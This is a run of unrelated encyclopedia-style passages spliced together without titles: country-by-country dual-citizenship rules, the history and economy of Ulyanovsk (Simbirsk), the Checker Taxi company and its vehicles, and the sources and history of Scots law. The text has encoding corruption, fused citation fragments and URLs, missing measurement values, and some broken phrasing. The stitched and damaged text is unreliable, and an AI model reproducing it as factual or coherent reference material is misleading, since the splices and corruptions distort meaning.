illegitimate or adopted, below eighteen (18) years of age, shall be deemed citizens of the Philippines, and that natural born citizens of the Philippines who become citizens of a foreign country subsequent to its enactment would retain their Philippine citizenship upon taking the oath.. *Sri Lanka allows dual citizenship. However, under the 19th amendment of that country's constitution, dual citizens are not allowed to hold public office. *Bahrain and Qatar do not allow dual citizenship. *Lebanon allows dual citizenship. *Israel allows dual citizenship except in the case of one being chosen as a member of the Knesset or appointed a government minister, in which case one must relinquish other citizenships when possible.Basic Law: The Knesset 16a and Basic Law: The Government 6(d). *Iraq allows dual citizenship. *Syria allows dual citizenship. *Kyrgyz Republic allows dual citizenship, but only if a mutual treaty on dual citizenship is in force. *The Indian constitution does not allow voluntary Dual Citizenship. However, in response to persistent demands for dual citizenship, The Overseas Citizenship of India (OCI) scheme was introduced by amending The Citizenship Act, 1955 in August 2005. The older PIO classification was merged with OCI in 2015. *Japan does not allow dual citizenship. In 2016, Japanese politician Lien-Fang was accused of her dual citizenship between Japan and Chinese-Taipei. = Europe =  EU and EFTA countries and microstates  Like all countries, EU and EFTA countries have varying policies regarding dual citizenship. However, under EU rules, a citizen of one EU or EFTA country can live and work indefinitely in the other EU and EFTA countries. However, this rule does not apply to citizenship, and countries can limit the right to vote and work in certain sensitive fields (such as government, police, military) to local citizens only. The countries can exclude immigrants from getting welfare for a certain time period to avoid \\"welfare tourism,\\" and they can refuse welfare completely if the immigrants do not have a job after a certain period of time and do not try to get one. Immigrants convicted of welfare fraud can be deported and be refused the re-entry of the country. On September 15, 2015, the European Court of Justice ruled that EU countries can refuse to pay unemployment benefits to immigrants who have lost their job even if they are citizens of other EU countries. The judge stated that EU rules allow member states to refuse unemployment benefits to people from other EU nations to stop them becoming \\"an unreasonable burden on the social assistance system of the host Member State\\". This backs up a November 2014 ruling, in which the court ruled that \\"poverty immigrants\\" who came to Germany just to receive social security benefits were not entitled to receive them. Within the EU, mandatory military service exists, at least in peacetime, only in Austria, Cyprus, Estonia, Finland, and Greece (In all countries but Cyprus, alternative service is available). Within the EFTA countries, only Switzerland requires it (alternative service is available); Iceland and Liechtenstein have no armed forces; in Norway, military service is de jure mandatory, but the enforcement is limited, so some sources claim it is de facto voluntary. = EU countries and microstates = For details, see the nationality law of the country concerned and Citizenship of the European Union. *In Austria, dual citizenship is possible with special permission or if it was obtained at birth.

The city, founded as Simbirsk (), is the birthplace of Vladimir Lenin (born Ulyanov), for whom it was renamed after his death in 1924, and Alexander Kerensky, the leader of the Russian Provisional Government that was overthrown by Lenin during the October Revolution of 1917. It is also famous for its writers such as Ivan Goncharov, Nikolay Yazykov and Nikolay Karamzin, and painters such as Arkady Plastov and Nikas Safronov. Ulyanovsk has been designated a UNESCO City of Literature since 2015. History Simbirsk was founded in 1648 by the boyar Bogdan Khitrovo.http://ulpressa.ru/2013/12/18/ot-bogdana-hitrovo-do-bogdana- hitrovo-2/ The fort of \\"Simbirsk\\" (alternatively \\"Sinbirsk\\") was strategically placed on a hill on the Western bank of the Volga River. The fort was meant to protect the eastern frontier of the Russian Empire from the nomadic tribes and to establish a permanent Imperial presence in the area. The Bogdan Khitrovo Monument in downtown Ulyanovsk In 1668, Simbirsk withstood a month-long siege by a 20,000-strong army led by rebel Cossack commander Stenka Razin. Also in Simbirsk another country rebel, Yemelyan Pugachev, was imprisoned before execution. At the time Simbirsk possessed a wooden kremlin, which was destroyed by a fire during the 18th century. As the eastern border of the Russian Empire was rapidly pushed into Siberia, Simbirsk rapidly lost its strategic importance, but nonetheless began to develop into an important regional center. Simbirsk was granted city status in 1796. Monument to Nikolay Karamzin. In the summer of 1864, Simbirsk was severely damaged by fire; however, it was quickly rebuilt and continued to grow. The Holy Trinity Cathedral was constructed in a restrained Neoclassical style between 1827 and 1841. The population of Simbirsk reached 26,000 by 1856 and 43,000 by 1897. In 1924, the city was renamed Ulyanovsk in honor of Vladimir Ulyanov, better known as Lenin, who was born in Simbirsk in 1870. Two other Russian political leaders, Alexander Kerensky and Alexander Protopopov, were also born in Simbirsk. The construction of the Kuybyshev hydroelectric plant (completed in 1957) downstream of Ulyanovsk resulted in the flooding of significant tracts of land both north and south of Ulyanovsk and increasing the width of the Volga by up to in some places. To this day, some populated neighborhoods of Ulyanovsk remain well below the level of the reservoir, protected from flooding by a dam: it is estimated that its catastrophic failure would submerge parts of the city comprising around 5% of its total population with as much as of water. During the Soviet period, Ulyanovsk was an important tourist center, drawing visitors from around the country because of its revolutionary importance. After the dissolution of the Soviet Union, the tourist importance of Ulyanovsk sharply decreased. In the 1990s, the city went through the hardest times‚Äîa slump in production in all branches, mass unemployment, and a population impoverishment. Besides the policy of the regional authorities of that time leaning against the grants and the Soviet system of managing, has led to serious crisis of a city infrastructure. In the first decade of the 2000s the economy started to grow. Ulyanovsk slowly recovered from these downturns into regional manufacturing, educational and transportation clusters. Politics Ulyanovsk Oblast Administration The city is headed by a mayor who is the executive branch, and city council which is the legislative branch. The term of the mayor is five years. In 2010 the city council abolished the direct elections to the mayor, replacing it with city manager, appointed by the council. Then again, in April 2013 the city charter was amended to re-introduce the direct mayoral election. Administrative and municipal status Ulyanovsk serves as the administrative center of the oblast. Within the framework of administrative divisions, it is, together with thirty rural localities, incorporated as the city of oblast significance of Ulyanovsk‚Äîan administrative unit with the status equal to that of the districts.Law #126-ZO As a municipal division, the city of oblast significance of Ulyanovsk is incorporated as Ulyanovsk Urban Okrug.Law #043-ZO Demographics Regional Museum of History and Arts In 2008, there were registered 6,774 births and 8,054 deaths in Ulyanovsk.http://www.regnum.ru/news/1112275.html =Ethnic composition=Russians: 78% *Tatars: 10% *Chuvash: 6% *Mordvins: 2% *Germans: 1% Climate Ulyanovsk has a humid continental climate (K√∂ppen climate classification Dfb).

The 31st Airborne Brigade of the Russian Airborne Troops of the armed forces is based in Ulyanovsk. \\"Bridgestone Tire Manufacturing CIS\\" - Japan tyre fabrick, work from 2016 =Tourism and hospitality industry= Bank of Russia in Ulyanovsk Tourism is a growing industry in the city and the surrounding areas because of Volga micro-climate and historical significance of Simbirsk.http://www.lonelyplanet.com/russia/volga-region/ulyanovsk Hilton Hotel Group and Marriott Hotels & Resorts are building their hotels in the downtown area. The region of Undory, a driving distance from Ulyanovsk is famous for its spas and mineral water. The city offers many options for sports enthusiasts. The countryside is ideal for outdoor and water sports. The springs of Undory have been known for more than 200 years. The water at spa is rich in sodium chloride, and comes from artesian wells. =Retail and restaurants= Retail is a growing business segment in this city. International retailers such as Auchan SA, METRO AG, Media Markt, Decathlon as well as local Russian chains such as X5 Retail, Magnit, Lenta (retail), Sportmaster, M.video opened up their stores in Ulyanovsk. Aqua Mall is an American-type mall concept that opened in Ulyanovsk on the banks of Sviyaga river with modern cinema theater, IMAX. The city has a large presence of international fast food brands such as McDonald's, Burger King, Baskin Robbins, Sbarro, and others. Local Russian brands are well-represented in this market. =Transportation and logistics= The President Bridge. The Imperial Bridge across the Volga River in Ulyanovsk. A railway bridge across the Volga was built in 1912‚Äì1916 and two automobile lanes were added to it in 1953‚Äì1958, allowing for the city to expand on the Eastern (left) bank of the river and transforming it into a local transport hub. According to Ulyanovsk Region Development Corporation, Ulyanovsk Region is conveniently situated in the center of the European part of Russia, where east west and north south air, rail, car and river routes cross. It has an industrial, transport and business infrastructure and a developed network of roads and railways which provide a good basis for turning Ulyanovsk into a major transport and logistics hub in the Volga Federal district working not only for Ulyanovsk Region's plants but the whole Volga federal district. Ulyanovsk transport hub provides all forms of transport (busy river port and passenger terminal, railways with two major passenger and cargo stations, airports and now two major bridges) apart from sea, which can serve Russian and international cargo traffic to Kazakhstan, Central Asia and South East Asia, Europe, China and back.http://www.ulregion.com/en/ As the aging Ulyanovsk bridge, the only crossing of the Volga in the 400 km stretch from Kazan to Tolyatti, could no longer cope with the growing needs of the city, the construction of President Bridge, a truss bridge, began in the late 1980s. Completion was delayed significantly due to catastrophic economic circumstances following the end of the Soviet Union. Its official opening ceremony was on November 24, 2009 by the Russian President Dmitry Medvedev ‚Äì although traffic was using the bridge a few days earlier.http://en.rian.ru/trend/artillery_depot_fire/ The bridge has a total length of 5.5 km, making it one of the longest in Europe.Minister of Transport Russian Federation Igor Levitin in the course of working trip to Ulyanovsk Region will estimate the possibility of SEZ creation of port type, PRIME-TASS, Saransk, June 17, 2008 The city is divided by the river Sviyaga, a tributary of the Volga whose confluence with it is about 200 km north of the city. Public transportation in the city is well developed and provided by 17 tram lines, 7 trolleybus routes (and all tram lines are only on the right-bank part of the city, and all the trolley only on the left bank), 50 municipal bus routes, and about 150 fixed-route taxi (marshrutkas) lines. The City of Ulyanovsk has a working plan to build high-speed rail system to connect the two banks of the town. Ulyanovsk is served by the Ulyanovsk Vostochny Airport (the international airport) in the left-bank part of the city and Ulyanovsk Baratayevka Airport (Ulyanovsk Central Airport) in the right-bank part of the city.

Architecture During the Soviet period, Ulyanovsk lost much of its historical heritage. All traces of the original wooden fort have disappeared, as have the churches of old Simbirsk; the majority of 19th-century buildings remain in the city, including the houses where Lenin lived between 1870 and 1887. The reconstruction of the Cathedral of the Holy Trinity was considered, but has since been canceled. However, many historical constructions remain. Among them the house in which writer Ivan Goncharov was born, the Protestant church and other buildings. Ulyanovsk is home to several tourist destinations around the downtown museum district and famous Volga River tours. The Ulyanovsk State historical memorial complex \\"Lenin\`s hometown\\" houses the regional city center, the center of Simbirsk-Ulyanovsk. The memorial estate has been recreating the local culture connected with architecture, education and way of life of Russia since the end of the 19th century till the beginning of the 20th century. The State historical memorial complex \\"Lenin\`s hometown\\" was founded in 1984. Now it consists of 14 museums and the Showroom, and has got a young creative collective of 152 people.http://www.ulzapovednik.ru/en/ Sports VolgaOfficial home page plays in the Russian Bandy Super League.

Checker Taxi was a dominant taxicab company that was based in Chicago, Illinois. Checker Motors was an American car company (formerly: Markin Automobile Body). Both companies were owned by Morris Markin by the 1930s. The Checker, particularly the 1959‚Äì82 Checker A series sedans remain the most famous taxicab vehicles in the United States. The vehicle is comparable to the London TaxiLondon Taxi in its internationally renowned styling, which went largely unchanged from 1959 to keep production costs down. History Motorized taxicabs began to appear on the streets of major cities from the early 1900s. Particularly in Chicago, where numerous railroads had terminals, there was considerable need for on-demand, point-to-point chauffeur-driven transportation. Hotels, department stores, and office buildings embraced the amenity, but often limited access to their facilities to a single cab company. Kickbacks were common, and the system favored larger operators, who had the financial resources to \\"play the game\\". By 1920, there were two dominant taxicab companies operating in Chicago: Yellow Cab and Checker Taxi. Yellow Cab Company was founded in 1910 by John Hertz who subsequently established his own cab manufacturing business in 1917. Checker Taxi did not own its own cab manufacturing company, but principally used Mogul Cabs, manufactured by Commonwealth. Morris Markin, a clothier from Chicago, Illinois, became the owner of 'Markin Automobile Body', an auto-body manufacturer based in Joliet, Illinois following a default by the owner on a $15,000 personal loan. The facility made bodies for Commonwealth Motors, which marketed the vehicles to cab companies under the trade name 'Mogul'. 1922 Model H-2 taxicab Commonwealth Motors was on the verge of bankruptcy but had an order from Checker Taxi (a privately owned cab company by George Hilsky in Chicago and New York City that had no affiliation with Markin at the time). Markin acquired Commonwealth Motors via a stock swap, and merged it with Markin Automobile Body, forming Checker Cab Manufacturing in order to honor the contractual commitment. Checker cabs were manufactured in Joliet for two years, then production was shifted to Kalamazoo, Michigan. The sturdy Checker cabs gained the acceptance and loyal following of Checker Taxi operators in Chicago. Markin began buying up Checker Taxi operators' licenses in 1924, gaining full control of the company in 1937. Markin followed Hertz's business plan in having drivers open doors for the fares, and outfitted each driver with a uniform. Checker became the first cab company to hire African-American drivers and the first to require that drivers pick up all fares, not just European-American ones. Competition for fares in Chicago was fierce in the 1920s, and drivers began ganging up on one another between fares. The fighting between the two cab companies escalated to the point where Markin's home was firebombed, which prompted Markin to relocate Checker Cab Manufacturing to Michigan. Hertz had sold the controlling interest in his Yellow Cab Company to the Parmelee Transportation Company, but in 1929, after a suspicious fire at his stables killed his prized race horses, Hertz sold his remaining shares of Yellow Cab to Markin, who subsequently acquired another one-third in the company from Parmelee, thus taking control of both Parmelee and Yellow Cab. In 1940, Parmelee (including Yellow and Checker Cab) became the largest cab company in the United States. Prior to selling the Yellow Cab company, Hertz had sold his taxi-cab, truck, and coach manufacturing arm in 1925 to General Motors. GM wanted to sell part of the acquired business and made an offer to Markin, but Markin declined. Rather than eliminate the capacity of Yellow Manufacturing, General Motors entered the taxicab business in New York City as Terminal Taxi Cab. General Motors operated Yellow Coach as a subsidiary until 1943, at which time the company was merged with GMC Truck Division, and manufacturing shifted from Chicago to Pontiac, Michigan. 1933 Model T taxicab A second \\"taxi war\\" broke out, with Checker Taxi Co and Terminal Taxi Co operators fighting it out in New York City. To end the dispute, New York Mayor Jimmy Walker created the New York Taxi Cab Commission (now called the New York City Taxi and Limousine Commission), which issued a limited number of cab operator permits, called taxi medallions, and mandated that cabs have seating for five passengers in the rear compartment, which favored Checker and a handful of other manufacturers that built automobiles which met this requirement. Over the next three decades, Markin was involved in the formation of \\"Checker Taxi\\" or \\"Checker Cab\\" companies in a number of major U.S. cities. At one point, Markin sold Checker Cab Manufacturing to E.L. Cord, but bought it back again in 1936. Markin and Cord were friends, and after Cord bought up interest in Checker, he retained Markin as company head. Meanwhile, the large, heavy Checker Model T, introduced in 1932, featured an 8-cylinder Lycoming engine, the same one that powered the classic Cords at the time. Checker had used Lycoming 6-cylinder engines since introduction of the Checker Model G in 1927. Prior to that, most Checkers had been powered by 4-cylinder Buda engines. 1936 Model Y taxicab The 1935 Checker Model Y featured attractive front end styling that could have been influenced by the Cord 810/812, or the 1933-34 Ford V8. The Y model continued in production until 1938. For 1939, Checker introduced a brand new model, the Model A. From that time, all future Checkers would carry the \\"A\\" designation, usually with a number. The 1939 Model A featured a retractable roof section at the very back of the greenhouse, distinctive stylized headlight lenses, and unusual open-sided front fenders. The rear roof section could be opened if passengers desired an open-air ride. The open-sided fenders in front detracted from the car's styling but made fender repairs easier for fleet owners. Beginning in 1939, Checkers were powered by the well-known Continental \\"Red Seal\\" inline six- cylinder engine, until the engine was discontinued in 1964. Starting in the 1950s, Checker offered an optional overhead valve version of the Continental six. During WWII, Checker, like other American automakers, switched to wartime production, building material needed by the U.S. Armed Forces. After the war, Checker cars, although mechanically similar to the pre-war models, were styled like many late 1940s sedans. The new model, introduced in 1947, had a wheelbase and featured unit body construction. This basic design continued in production until 1956. 1950 Model A4 taxicab 1950 Model A4 taxicab 1958 Model A8 taxicab * Model A2 - 1947-49 * Model A3/A4 - 1950-52 * Model A6-A7 - 1953-54 * Model A8 - 1956-58 * Model A9/A10 - 1959-63 * Model A11/A12 - 1963-82 In 1954, New York City revised its specifications for taxicabs, eliminating the five-passenger rear compartment requirement and stipulating a wheelbase of or less, which effectively took Checker out of the market. A brand-new 120\\" wheelbase body-on-frame design was introduced in December 1956, called A8, and that basic body style would be retained for the duration of Checker production until the end, in 1982. The 1956 through 1958 A8 Checkers featured single headlights, 1953-1954 Pontiac Station Wagon taillight lenses, and a thick, single-bar grille. In 1958, quad headlights became legal in the U.S., and Checkers featured the quad headlights from that time forward, along with a new egg-crate grille insert. Parking lights were housed in each far side of the grille insert. Taillights were also changed to the familiar vertical chrome strip housing dual red lenses. Early models also featured a single separate bumper-mounted backup light. Another change between the A8 and later models is the rear window. Originally flat in the A8 with a thicker \\"C\\" pillar, the rear window on later models wrapped around a thinner roof-line, affording improved all-around visibility. For 1960, Checker introduced the A9 series taxi, as well as for the first time, a passenger sedan to be marketed to the general public, the A10 Superba. For 1961, the Marathon sedan and station wagon were introduced, upscale versions of the Superba. The Superba was discontinued in 1963, and from that time on, the taxicabs were designated A11, the Marathon became the A12. With the cancellation of the Continental inline six-cylinder engine for 1965, Checker switched to Chevrolet overhead- valve inline 6-cylinder engines, with the small-block Chevy 283 and 327 V8s optional. Starting in 1970, Checker used the ubiquitous 350 cubic-inch small- block Chevrolet V8 as an option, which was available until the end of production. GM phased out the Chevy inline six in 1979. Starting in 1980, both Chevrolet and Checker offered a new 229 cubic-inch V6 as the standard engine, with a small-block 305 or 350 V8 as optional. The standard transmission for the Checker since the 1930s was a conventional 3-speed manual. In 1956, Checker offered a \\"Driv-Er-Matic Special\\" which featured a Borg-Warner automatic transmission and an overhead-valve Continental inline 6. By 1970 GM's Turbo Hydra-Matic 400 transmission became standard on all Checkers. Starting in 1959, Checker began producing passenger car versions of the taxis to the general public. The first of these models were labeled \\"A10 Superba\\" and the line included a sedan as well as a station wagon. Superbas were built from 1960 through 1963. A more luxurious model called the \\"A12 Marathon\\" was introduced in 1961, and remained in production until 1982. To the public, Checker cars were advertised as a roomy and rugged alternative to the standard American passenger sedan. A Marathon station wagon (Model A12W) was also offered, but buyers preferred style and power over practicality, so the Checkers saw limited sales with the public. In 1964, the State of New York pursued Markin and Checker on antitrust charges, alleging that it controlled both the taxi service and manufacture of taxis, and thus favored itself in fulfilling orders. Rather than allow Checker drivers to begin buying different brands of cars, Markin began selling licenses in New York City. As U.S. Federal safety rules increased throughout the 1960s and 1970s, Checkers kept pace and despite having the same basic body design, Checker enthusiasts can often identify the year of a Checker based on its safety equipment. For example, starting in 1963, amber parking/directional lights were used up front. 1964 models introduced lap belts in front, energy-absorbing steering columns came in 1967. 1968 models featured round side marker lights on fenders along with shoulder belts, and 1969s introduced headrests for front outboard seating positions. 1970 began the use of full-size Chevrolet steering columns and steering wheels. 1973 and 1974 models replaced the chrome-plated bumpers for larger, beam-type units that were painted aluminum and protected the lights in a 5-mph impact. The 1975 and later models were labeled \\"Unleaded Fuel Only,\\" and 1978 introduced the new delta-style Chevrolet steering wheel. In the 1970s, power steering and power-assisted front disc brakes became standard. In 1978, the windshield wipers became parallel-action. During the late 1960s and 1970s, Checker sold a few specialized versions of the A11. These included the Medicar and the Aerobus. The Medicar was introduced in 1969 and was designed to function as an ambulance, or transporter for wheelchair- bound passengers. The rear doors were large enough to allow a wheelchair to enter the car, and they swung open almost 180 degrees. This car also featured a raised roof, and facilities to lock a wheelchair to the floor when in motion. The Aerobus was a stretched version of the A12W Station Wagon. It accommodated up to 12 passengers and was marketed as an airline shuttle. Despite its reputation as a basic taxicab, luxury, limousine-type Marathons were also available mostly in later years. One A-12E model, specially built for the wife of the CEO of the company, remains in brand-new condition with less than 50 miles on the odometer. Checker limos offered vinyl roofs with opera windows, power-assisted accessories, and luxurious upholstery. The final Checker A11/A12s were manufactured in 1982, when Checker exited the automobile manufacturing business. The company continued operation at partial capacity making parts for General Motors until January 2009 when it declared bankruptcy. Checker Taxicabs in the media Because their styling changed little during its production run from 1958 through 1982, many film producers were not careful to use period-correct Checker cars in their work. Often, a later model Checker (with side marker lights, late-1970s bumpers, etc.) was used in 1950s or 1960s settings. Modified Checkers were also used to represent soviet GAZ-13 cars in movies and TV series, most notably the 1983 film Gorky Park and the 1966 Mission: Impossible TV series. * Travis Bickle, in Taxi Driver, drove a 1975 A11. *Phoebe Buffay, in Friends, drove a 1977 A11. In Grand Theft Auto games, the Checker Taxi appears as a controllable taxicab known as the \\"Cabbie\\". Collectibility New York City, 2011 With the exception of the A10, A11, and Marathon models, only a handful of pre-1960 Checkers exist. They were produced in the thousands, but led a life of rough city streets, constant idling, and high mileage. Once they were retired from taxi service, they typically were scrapped. Once production ceased in 1982, collectors became interested. At that time, however, only the later models still existed, so those are the cars that can be found today. Two restored older Checkers reside in the Gilmore Museum in Kalamazoo, Michigan. One is a 1923 Model E, the other is a 1936 Model Y. The museum also features the very last car the company assembled, a 1982 A11 taxi in Chicago green and ivory livery. At least two A8s exist, one a Driv-R-Matic Special, in restored condition. In the early 1950s, a number of worn Checker A2s and A4s were shipped to Finland to address an automobile shortage. A 1939 Model A is also in the hands of a private collector, completely restored. It is the only Model A known to exist today. Several hundred post-1960 Checkers in various conditions exist.

It is a hybrid or mixed legal system containing civil law and common law elements, that traces its roots to a number of different historical sources.Palmer, p. 201Tetley, Part IThomson, pp.51-91 Together with English law and Northern Irish law, it is one of the three legal systems of the United Kingdom.Stair, General Legal Concepts (Reissue), para. 4 (Online) Retrieved 2011-11-29 Early Scots law before the 12th century consisted of the different legal traditions of the various cultural groups who inhabited the country at the time, the Gaels in most of the country, with the Britons and Anglo-Saxons in some districts south of the Forth and with the Norse in the islands and north of the River Oykel. The introduction of feudalism from the 12th century and the expansion of the Kingdom of Scotland established the modern roots of Scots law, which was gradually influenced by other, especially Anglo-Norman and continental legal traditions. Although there was some indirect Roman law influence on Scots law, the direct influence of Roman law was slight up until around the 15th century. After this time, Roman law was often adopted in argument in court, in an adapted form, where there was no native Scots rule to settle a dispute; and Roman law was in this way partially received into Scots law. Scots law recognises four sources of law: legislation, legal precedent, specific academic writings, and custom. Legislation affecting Scotland may be passed by the Scottish Parliament, the United Kingdom Parliament, and the European Union. Some legislation passed by the pre-1707 Parliament of Scotland is still also valid. Since the Union with England Act 1707, Scotland has shared a legislature with England and Wales. Scotland retained a fundamentally different legal system from that south of the border, but the Union exerted English influence upon Scots law. Since the UK joined the European Union, Scots law has also been affected by European law under the Treaties of the European Union, the requirements of the European Convention on Human Rights (entered into by members of the Council of Europe) and the creation of the devolved Scottish Parliament which may pass legislation within all areas not reserved to Westminster, as detailed by the Scotland Act 1998.Sch. 5 Scotland Act 1998Devolved and reserved matters explained , Scottish Parliament, Retrieved 2011-10-22 Scotland as a distinct jurisdiction The United Kingdom, judicially, consists of three jurisdictions: England and Wales, Scotland, and Northern Ireland. There are important differences between Scots law, English law and Northern Irish law in areas such as property law, criminal law, trust law,Gretton & Steven, p. 318 inheritance law, evidence law and family law while there are greater similarities in areas of UK-wide interest such as commercial law, consumer rights,Davidson, p. 2 taxation, employment law and health and safety regulations.Davidson, p. 56 Examples of differences between the jurisdictions include the age of legal capacity (16 years old in Scotland but 18 years old in England and Wales),Age of Legal Capacity (Scotland) Act 1991 (c. 50), opsi.gov.uk and the fact that equity was never a distinct branch of Scots law.Stair, vol. 22, para. 399: \\"Equity in Scots law. As will appear, the historical place of equity in the development of Scots law is no mere replication of the English position. No separate equity court appeared in Scotland. The Scottish commentators were given to searching for parallels to contemporary Scottish arrangements in the texts of Roman law. 'Equity' does not obviously exist as a distinct branch of law at the present day. Nevertheless, the status of equity as a source of law is nowadays much the same in Scotland as it is in England and Wales.\\" Some examples in criminal law include: * The use of 15-member juries for criminal trials in Scotland (compared with 12-member juries in England and Wales) who always decide by simple majority.Jones, p. 46 * The accused in a criminal trial does not have the right to elect between a judge or jury trial. * Judges and juries of criminal trials have the \\"third verdict\\" of \\"not proven\\" available to them.Jones, p. 47 There are also differences in the terminology used between the jurisdictions. For example, in Scotland there are no magistrates' courts or Crown Court, but there are justice of the peace courts, sheriff courts and the College of Justice. The Procurator Fiscal Service provides the independent public prosecution service for Scotland like the Crown Prosecution Service in England and Wales and the Public Prosecution Service in Northern Ireland. History Scots law can be traced to its early beginnings as a number of different custom systems among Scotland's early cultures to its modern role as one of the three legal jurisdictions of the United Kingdom. The various historic sources of Scots law, including custom, feudal law, canon law, civilian ius commune and English law have created a hybrid or mixed legal system. The nature of Scots law before the 12th century is largely speculative, but is likely to have been a mixture of different legal traditions representing the different cultures inhabiting the land at the time, including Gaelic, Welsh, Norse and Anglo-Saxon customs.Scottish Legal History: A Research Guide, Georgetown Law Library, Retrieved 2011-10-22 There is evidence to suggest that as late as the 17th century marriage laws in the Highlands and Islands still reflected Gaelic custom, contrary to Catholic religious principles.Stair, vol. 22, para. 504 (Online) Retrieved 2011-10-26 The formation of the Kingdom of Scotland and its subjugation of the surrounding cultures, completed by the Battle of Carham, established what are approximately the boundaries of contemporary mainland Scotland.Reid, I. Introduction and Property, p. 15 The Outer Hebrides were added after the Battle of Largs in 1263, and the Northern Isles were acquired in 1469, completing what is today the legal jurisdiction of Scotland.Reid, I. Introduction and Property, p. 16 From the 12th century feudalism was gradually introduced to Scotland and established feudal land tenure over many parts of the south and east, which eventually spread northward.Stair, vol. 22, para. 505 (Online) Retrieved 2011-10-26Reid, I. Introduction and Property, p. 20 As feudalism began to develop in Scotland early court systems began to develop, including early forms of Sheriff Courts. Under Robert the Bruce the importance of the Parliament of Scotland grew as he called parliaments more frequently, and its composition shifted to include more representation from the burghs and lesser landowners.Reid, I. Introduction and Property, p. 38 In 1399 a General Council established that the King should hold a parliament at least once a year for the next three years so \\"that his subjects are served by the law\\".Legislation - Records of the Parliaments of Scotland, 1399/1/13. Translation: \\"Item, it is ordained that each year the king shall hold a parliament so that his subjects are served by the law, which shall begin on the morning after All Hallows' day [2 November], for the next three years.\\" In 1318 a parliament at Scone enacted a code of law that drew upon older practices, but it was also dominated by current events and focused on military matters and the conduct of the war of Scottish Independence.Reid, I. Introduction and Property, p. 40 From the 14th century we have surviving examples of early Scottish legal literature, such as the Regiam Majestatem (on procedure at the royal courts) and the Quoniam Attachiamenta (on procedure at the baron courts).Stair, vol. 22, para. 512 (Online) Retrieved 2011-10-26 Both of these important texts, as they were copied, had provisions from Roman law and the ius commune inserted or developed, demonstrating the influence which both these sources had on Scots law.Reid, I. Introduction and Property, p. 46 From the reign of King James I to King James V the beginnings of a legal profession began to develop and the administration of criminal and civil justice was centralised.Reid, I. Introduction and Property, p. 52 The Parliament of Scotland was normally called on an annual basis during this period and its membership was further defined.Reid, I. Introduction and Property, p. 54 The evolution of the modern Court of Session also traces its history to the 15th and early 16th century with the establishment of a specialised group of councillors to the King evolving from the King's Council who dealt solely with the administration of justice. In 1528, it was established that the Lords of Council not appointed to this body were to be excluded from its audiences and it was also this body that four years later in 1532 became the College of Justice.Stair, vol. 22, para. 515 (Online) Retrieved 2011-10-26 The Acts of Union 1707 merged the Kingdom of Scotland and the Kingdom of England to form the new Kingdom of Great Britain. Article 19 of the Act confirmed the continuing authority of the College of Justice, Court of Session and Court of Justiciary in Scotland.See Act of Union 1707, Wikisource Article 3, however, merged the Estates of Scotland with the Parliament of England to form the Parliament of Great Britain, with its seat in the Palace of Westminster, London. Under the terms of the Act of Union, Scotland retained its own systems of law, education and Church (Church of Scotland, Presbyterian polity), separately from the rest of the country. The Parliament of Great Britain otherwise was not restricted in altering laws concerning public right, policy and civil government, but concerning private right, only alterations for the evident utility of the subjects within Scotland were permitted. The Scottish Enlightenment then reinvigorated Scots law as a university-taught discipline. The transfer of legislative power to London and the introduction of appeal in civil but not criminal cases to the House of Lords (now, by appeal to the new Supreme Court of the United Kingdom) brought further English influence. Acts of the Parliament began to create unified legal statutes applying in both England and Scotland, particularly when conformity was seen as necessary for pragmatic reasons (such as the Sale of Goods Act 1893). Appeal decisions by English judges raised concerns about this appeal to a foreign system, and in the late 19th century Acts allowed for the appointment of Scottish Lords of Appeal in Ordinary. At the same time, a series of cases made it clear that no appeal lay from the High Court of Justiciary to the House of Lords. Today the Supreme Court of the United Kingdom usually has a minimum of two Scottish justices to ensure that some Scottish experience is brought to bear on Scottish appeals.Profiles: UK Supreme Justices, BBC News, 30 September 2009 Scots law has continued to change and develop in the 20th century, with the most significant change coming under devolution and the reformation of the Scottish Parliament. =Influential sources= An early Scottish legal compilation, Regiam Majestatem, was based heavily on Glanvill's English law treatise, although it also contains elements of civil law, feudal law, canon law, customary law and native Scots statutes. Although there was some indirect Roman-law influence on Scots law, via medieval ius commune and canon law used in the church courts, the direct influence of Roman law was slight up until around the mid-15th century.Robinson, Fergus and Gordon, European Legal History, 3rd Edition, OUP, 2000 chapter 14 After this time, civilian ius commune was often adopted in argument in court, in an adapted form, where there was no native Scots rule to settle a dispute; and civil law was in this way partially received in subsidium into Scots law. Since the Acts of Union 1707, Scotland has shared a legislature with the rest of the United Kingdom. Scotland retained a fundamentally different legal system from that of England and Wales, but the Union brought English influence on Scots law. In recent years, Scots law has also been affected by European law under the Treaties of the European Union, the requirements of the European Convention on Human Rights (entered into by members of the Council of Europe) and the establishment of the Scottish Parliament which may pass legislation within its areas of legislative competence as detailed by the Scotland Act 1998.

Statutes must receive Royal Assent from the Queen before becoming law, however this is now only a formal procedure and is automatic.Royal Assent, Parliament of the United Kingdom, Retrieved 2011-10-22 Legislation of the Parliament of the United Kingdom is not subject to the review of the courts as the Parliament is said to have supreme legal authority; however, in practice the Parliament will tend not to create legislation which contradicts the Human Rights Act 1998 or European law, although it is technically free to do so.Parliamentary Sovereignty, Parliament of the United Kingdom, Retrieved 2011-10-22 The degree to which the Parliament has surrendered this sovereignty is a matter of controversy with arguments generally concerning what the relationship should be between the United Kingdom and the European Union.Wagner, Adam. Does parliamentary sovereignty still reign supreme?, The Guardian, 27 January 2011EU: Is Britain still a sovereign state?, The Daily Telegraph, 17 September 2009 Acts of the United Kingdom Parliament also regularly delegate powers to Ministers of the Crown or other bodies to produce legislation in the form of statutory instruments. This delegated legislation has legal effect in Scotland so far as the specific provisions of the statutory instrument are duly authorised by the powers of the Act, a question which can be subjected to judicial review. The Scottish Parliament is a devolved unicameral legislature that has the power to pass statutes only affecting Scotland on matters within its legislative competence. Legislation passed by the Scottish Parliament must also comply with the Human Rights Act 1998 and European law, otherwise the Court of Session or High Court of Justiciary have the authority to strike down the legislation as ultra vires.Boyle, pp. 309, 311Legal order -Scotland, European Commission, Retrieved 2011-10-22 There have been a number of high-profile examples of challenges to Scottish Parliament legislation on these grounds, including against the Protection of Wild Mammals (Scotland) Act 2002 where an interest group unsuccessfully claimed the ban on fox hunting violated their human rights.Scott, Kirsty.

